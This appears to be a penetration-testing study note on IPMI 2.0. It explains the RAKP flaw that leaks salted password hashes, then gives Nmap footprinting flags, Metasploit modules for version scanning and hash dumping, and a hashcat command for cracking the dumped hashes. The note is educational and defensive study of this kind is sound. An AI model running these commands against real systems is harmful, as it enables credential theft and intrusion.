## DANGEROUS CONFIGURATION
A flaw in the RAKP protocol in IPMI 2.0 allows the user to receive the salted SHA1 or MD5 hash of the user's password. The server sends it before the authentication procedure
## FOOTPRINTNG
Common port: 623

**NMAP**
Most used tool for footprinting
- [NSE(Nmap Scripting Engine)](https://nmap.org/book/nse.html) - A set of different scripts written for specific services

**NMAP COMMAND FLAGS**
- *--script-updatedb*: Updates the script database of NMAP
- *--script-trace*: trace the progress of NSE scripts at the network level
- *-sV*: Version scan
- *-A*: Aggressive scan
- *-sC*: Default script scan
- *-p \<port\>*:  defines which port to scan

Use the *--script ipmi-version* argument to retrieve IPMI version

**METASPLOIT VERSION SCAN**
First access the Metasploit console using *msfconsole*/

msf6 > *use auxiliary/scanner/ipmi/ipmi_version*
msf6 auxiliary(scanner/ipmi/ipmi_version) > *set rhosts \<ip-address\>*
msf6 auxiliary(scanner/ipmi/ipmi_version) > *run*

**METASPLOIT HASH DUMP**
First access the Metasploit console using *msfconsole*/

msf6 > *use auxiliary/scanner/ipmi/ipmi_dumphashes*
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > *set rhosts \<ip-address\>*
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > *run*

**HASHCAT**
Use haschat once you retrieve the salted SHA1 or MD5 password
Ex.
*hashcat -m 7300 \<salted-password-hash\> \<wordlist-file\>*

